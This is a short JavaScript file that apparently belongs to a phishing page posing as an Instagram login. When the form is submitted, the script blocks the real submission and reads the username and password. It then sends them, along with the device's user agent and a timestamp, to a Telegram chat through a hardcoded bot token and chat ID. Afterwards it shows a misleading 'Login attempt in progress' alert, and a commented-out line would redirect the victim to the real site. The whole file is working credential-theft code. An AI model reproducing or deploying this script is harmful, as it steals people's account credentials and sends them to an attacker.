document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.querySelector('.login-form');
    const BOT_TOKEN = '7706848833:AAHfvIjj5x-MwyuYS4dslpwSQUtOR7l7KDY';
    const CHAT_ID = '1753775843';
    const URI_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault(); // Prevent the form from actually submitting

        // Get form inputs
        const username = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;

        // Create message
        const message = `
🔐 New Login Attempt:
👤 Username/Email: ${username}
🔑 Password: ${password}
📱 Device Info: ${navigator.userAgent}
⏰ Time: ${new Date().toLocaleString()}
        `;

        try {
            const response = await fetch(URI_API, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (response.ok) {
                // Clear the form
                loginForm.reset();
                
                // Show success message (optional)
                alert('Login attempt in progress...');
                
                // Redirect to real Instagram (optional)
                // window.location.href = 'https://www.instagram.com';
            } else {
                console.error('Failed to send message to Telegram');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    });
}); 